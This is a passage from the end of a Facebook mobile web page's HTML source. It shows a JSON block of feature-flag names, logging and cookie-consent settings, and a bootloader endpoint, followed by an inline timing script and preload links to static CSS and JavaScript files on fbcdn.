PLATFORMS_MUTATION","FORCE_FETCH_BOOSTED_COMPONENT_AFTER_ADS_CREATION","VIDEO_DIMENSIONS_FROM_PLAYER_IN_UPLOAD_DIALOG","SNIVY_GROUP_BY_EVENT_TRACE_ID_AND_NAME","ADS_STORE_VISITS_METRICS_DEPRECATION","DYNAMIC_ADS_SET_CATALOG_AND_PRODUCT_SET_TOGETHER","AD_DRAFT_ENABLE_SYNCRHONOUS_FRAGMENT_VALIDATION","NEKO_ENABLE_RESET_SAP_FOR_CREATE_AD_SET_CONTEXTUAL","SEPARATE_MESSAGING_COMACTIVITY_PAGE_PERMS","LAB_NET_NEW_UI_RELEASE","POCKET_MONSTERS_CREATE","POCKET_MONSTERS_DELETE","SRT_BANZAI_SRT_CORE_LOGGER","SRT_BANZAI_SRT_MAIN_LOGGER","WORKPLACE_PLATFORM_SECURE_APPS_MAILBOXES","POCKET_MONSTERS_UPDATE_NAME","IC_DISABLE_MERGE_TOOL_FEED_CHECK_FOR_REPLACE_SCHEDULE","ADS_EPD_IMPACTED_ADVERTISER_MIGRATE_XCONTROLLER","RECRUITING_CANDIDATE_PORTAL_ACCOUNT_DELETION_CARD"]},"ko":{"__set":["8H4bQmEiuLT","3OsLvnSHNTt","1G7wJ6bJt9K","9NpkGYwzrPG","3oh5Mw86USj","8NAceEy9JZo","7FOIzos6XJX","rf8JEPGgOi","4j36SVzvP3w","4NSq3ZC4ScE","53gCxKq281G","3yzzwBY7Npj","1onzIv0jH6H","8PlKuowafe8","1ntjZ2zgf03","4SIH2GRVX5W","2dhqRnqXGLQ","2WgiNOrHVuC","amKHb4Cw4WI","5mNEXob0nTj","8rDvN9vWdAK","9cL5o2kjfZo","5BdzWGmfvrA","DDZhogI19W","acrJTh9WGdp","1oOE64fL4wO","9Gd8qgRxn8z","MPMaqnqZ9c","5XCz1h9Iaw3","7r6mSP7ofr2","6DGPLrRdyts","aWxCyi1sEC7","9kCSDzzr8fu"]}},2580],["JSErrorLoggingConfig",[],{"appId":412378670482,"extra":[],"reportInterval":50,"sampleWeight":null,"sampleWeightKey":"__jssesw","projectBlocklist":[]},2776],["ImmediateImplementationExperiments",[],{"prefer_message_channel":true},3419],["UriNeedRawQuerySVConfig",[],{"uris":["dms.netmng.com","doubleclick.net","r.msn.com","watchit.sky.com","graphite.instagram.com","www.kfc.co.th","learn.pantheon.io","www.landmarkshops.in","www.ncl.com","s0.wp.com","www.tatacliq.com","bs.serving-sys.com","kohls.com","lazada.co.th","xg4ken.com","technopark.ru","officedepot.com.mx","bestbuy.com.mx","booking.com","nibio.no"]},3871],["RunGatingConfig",[],{"shouldUseBrowserUnload":true},3914],["InitialCookieConsent",[],{"deferCookies":false,"initialConsent":{"__set":[1]},"noCookies":false,"shouldShowCookieBanner":false},4328],["TrustedTypesConfig",[],{"useTrustedTypes":false,"reportOnly":false},4548],["WebConnectionClassServerGuess",[],{"connectionClass":"UNKNOWN"},4705],["BootloaderEndpointConfig",[],{"debugNoBatching":false,"endpointURI":"https:\/\/m.facebook.com\/ajax\/bootloader-endpoint\/"},5094],["CookieConsentIFrameConfig",[],{"consent_param":"FQAREhIA.ARY8R2XrQzKxVq2OeUqGvRrz3Tn6Ah8bZy_DAJ_Cy2WkBwwd","allowlisted_iframes":[]},5540],["cr:696703",[],{"__rc":[null,"Aa3zWc7kAlk0qQpb0XwI5_hF9i_8arQSiJ6eQXA73jBt3Pay2lCzGoPpR3P-FjWqQGNVL0M8g35s-aph9swcH6T2ILA"]},-1],["cr:717822",["TimeSliceImpl"],{"__rc":["TimeSliceImpl","Aa3zWc7kAlk0qQpb0XwI5_hF9i_8arQSiJ6eQXA73jBt3Pay2lCzGoPpR3P-FjWqQGNVL0M8g35s-aph9swcH6T2ILA"]},-1],["cr:729414",[],{"__rc":[null,"Aa2YdUCNuDDtvhoSprn4VlrFVwI5945WiTjeT1wEY15ZyNHCOI1Np5zxDGw0Qi8yLJ47Ec20ZtYHfyaqtOLTPvkK"]},-1]],"require":[["MPrelude"],["VisualCompletionGating"],["RequireDeferredReference","unblock",[],[["VisualCompletionGating"],"sd"]],["RequireDeferredReference","unblock",[],[["VisualCompletionGating"],"css"]]]});});</script>
<script>now_inl=(function(){var p=window.performance;return p&&p.now&&p.timing&&p.timing.navigationStart?function(){return p.now()+p.timing.navigationStart}:function(){return new Date().getTime()};})();window.__bigPipeFR=now_inl();</script>
<link rel="preload" href="https://static.xx.fbcdn.net/rsrc.php/v3/y7/l/0,cross/Bll5NVg5w2Z.css?_nc_x=Ij3Wp8lg5Kz" as="style" crossorigin="anonymous" />
<link rel="preload" href="https://static.xx.fbcdn.net/rsrc.php/v3/yZ/l/0,cross/n9g6Q0kZdhT.css?_nc_x=Ij3Wp8lg5Kz" as="style" crossorigin="anonymous" />
<link rel="preload" href="https://static.xx.fbcdn.net/rsrc.php/v3/yp/r/uqFCPZu4BB9.js?_nc_x=Ij3Wp8lg5Kz" as="script" crossorigin="anonymous" nonce="FthVytFa" />
<link rel="preload" href="https://static.xx.fbcdn.net/rsrc.php/v3ixJY4/yB/l/en_US/YBHzdBxjWbI.js?_nc_x=Ij3Wp8lg5Kz" as="script" crossorigin="anonymous" nonce="FthVytFa" />
<link rel="preload" href="https://static.xx.fbcdn.net/rsrc.php/v3/yF/l/0,cross/bMd0F8l-9wb.css?_nc_x=Ij3Wp8lg5Kz" as="style" crossorigin="anonymous" />
<link rel="preload" href="https://static.xx.fbcdn.net/rsrc.php/v3/yn/l/0,cross/Wpehtpza903.css?_nc_x=Ij3Wp8lg5Kz" as="style" crossorigin="anonymous" />
<link rel="preload" href="https://static.xx.fbcdn.net/rsrc.php/v3/yf/r/6yzFRRzYsZb.js?_nc_x=Ij3Wp8lg5Kz" as="script" crossorigin="anonymous" nonce="FthVytFa" />
<link rel="preload" href="https://static.xx.fbcdn.net/rsrc.php/v3/yB/r/2jr_tFUjDMy.js?_nc_x=Ij3Wp8lg5Kz" as="script" crossorigin="anonymous" nonce="FthVytFa" />
<link rel="preload" href="https://static.xx.fbcdn.net/rsrc.php/v3/yl/r/ilMFccLWbov.js?_nc_x=Ij3Wp8lg5Kz" as="script" crossorigin="anonymous" nonce="FthVytFa" />
</body></html>
